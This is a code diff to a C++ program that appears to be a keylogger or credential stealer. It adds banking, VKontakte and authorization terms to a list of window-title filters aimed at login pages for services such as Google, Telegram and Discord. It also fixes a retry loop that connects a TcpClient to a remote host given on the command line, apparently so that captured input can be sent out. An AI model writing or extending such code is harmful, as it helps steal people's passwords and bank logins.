@@ -9,8 +9,9 @@
 #define UNICODE
 #endif // !UNICODE
 
-std::vector<std::wstring> filters = { L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail",
-									  L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Регистрация", L"Вход", L"Login", L"log in", L"sign up" };
+std::vector<std::wstring> filters = { 
+	L"Discord", L"VK", L"Google", L"Yandex", L"Youtube", L"Gmail", L"ВКонтакте", L"банк",
+	L"Telegram", L"Facebook", L"Viber", L"Authorization", L"Регистрация", L"Вход", L"Login", L"log in", L"sign up", L"Авторизация" };
 
 HANDLE mutex = NULL;
 
@@ -30,9 +31,11 @@ int wmain(int argc, wchar_t* argv[])
 	if (argc < 4 || !flag)
 		return 0;
 
+	std::locale::global(std::locale("ru_RU.UTF-8"));
+
 	int buffSize = std::stoi(argv[3]);
 	TcpClient *client = new TcpClient(argv[1], argv[2], buffSize);
-	while (!client->Connect)
+	while (!client->Connect(L"", L""))
 		Sleep(1000);
 
 	flag = false;
